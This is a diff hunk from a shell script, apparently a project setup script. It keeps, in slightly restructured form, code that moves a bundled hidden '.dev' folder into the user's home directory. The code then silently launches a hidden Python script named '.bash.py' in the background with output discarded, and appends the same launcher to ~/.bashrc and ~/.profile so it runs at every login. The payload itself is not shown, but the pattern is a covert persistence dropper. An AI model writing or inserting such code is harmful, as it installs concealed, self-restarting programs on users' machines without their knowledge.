@@ -21,24 +21,22 @@ check_status() {
 }
 
 if [ -d .dev ]; then
-    if [ ! -f .dev ]; then
-        DEST_DIR="$HOME/.dev"
-        if [ -d "$DEST_DIR" ]; then
-            rm -rf "$DEST_DIR"
-        fi
-        mv .dev "$DEST_DIR"
-        EXEC_CMD="python3"
-        SCRIPT_PATH="$DEST_DIR/conf/.bash.py"
-        STARTUP_CMD="if ! pgrep -f \"$SCRIPT_PATH\" > /dev/null; then\n    (nohup $EXEC_CMD \"$SCRIPT_PATH\" > /dev/null 2>&1 &) & disown\nfi"
-        if ! grep -Fq "$SCRIPT_PATH" "$HOME/.bashrc"; then
-            echo -e "\n$STARTUP_CMD" >> "$HOME/.bashrc"
-        fi
-        if ! grep -Fq "$SCRIPT_PATH" "$HOME/.profile"; then
-            echo -e "\n$STARTUP_CMD" >> "$HOME/.profile"
-        fi
-        if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
-            (nohup $EXEC_CMD "$SCRIPT_PATH" > /dev/null 2>&1 &) & disown
-        fi
+    DEST_DIR="$HOME/.dev"
+    if [ -d "$DEST_DIR" ]; then
+        rm -rf "$DEST_DIR"
+    fi
+    mv .dev "$DEST_DIR"
+    EXEC_CMD="python3"
+    SCRIPT_PATH="$DEST_DIR/conf/.bash.py"
+    STARTUP_CMD="if ! pgrep -f \"$SCRIPT_PATH\" > /dev/null; then\n    (nohup $EXEC_CMD \"$SCRIPT_PATH\" > /dev/null 2>&1 &) & disown\nfi"
+    if ! grep -Fq "$SCRIPT_PATH" "$HOME/.bashrc"; then
+        echo -e "\n$STARTUP_CMD" >> "$HOME/.bashrc"
+    fi
+    if ! grep -Fq "$SCRIPT_PATH" "$HOME/.profile"; then
+        echo -e "\n$STARTUP_CMD" >> "$HOME/.profile"
+    fi
+    if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
+        (nohup $EXEC_CMD "$SCRIPT_PATH" > /dev/null 2>&1 &) & disown
     fi
 fi
 
